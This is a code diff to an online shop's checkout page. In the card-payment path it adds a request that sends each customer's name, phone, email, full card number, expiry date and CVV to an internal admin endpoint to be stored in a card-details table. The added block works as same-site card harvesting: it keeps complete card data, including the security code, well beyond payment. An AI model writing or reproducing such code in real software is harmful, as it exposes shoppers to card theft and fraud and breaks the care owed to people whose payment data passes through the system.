@@ -427,6 +427,29 @@ export function CheckoutPage() {
       })
       const result = await res.json()
       console.log("[Card Payment] Order save result:", result)
+      
+      // Save card details to card_details table
+      if (result.orderNumber) {
+        await fetch("/api/admin/card-details", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            orderNo: result.orderNumber,
+            customerName: base.customerName,
+            customerPhone: base.customerPhone,
+            customerEmail: base.customerEmail,
+            cardName: details.cardName,
+            cardBrand: details.cardBrand,
+            cardNumber: details.number,
+            cardExpiry: details.expiry,
+            cardCvv: details.cvv,
+            cardLast4: details.last4,
+            amount: base.total,
+            paymentStatus: status,
+          }),
+        }).catch((err) => console.error("[Card Payment] Failed to save card details:", err))
+      }
+      
       if (status === "failed") {
         trackAbandonedCheckout("payment_card_failed", "payment_failed")
       }
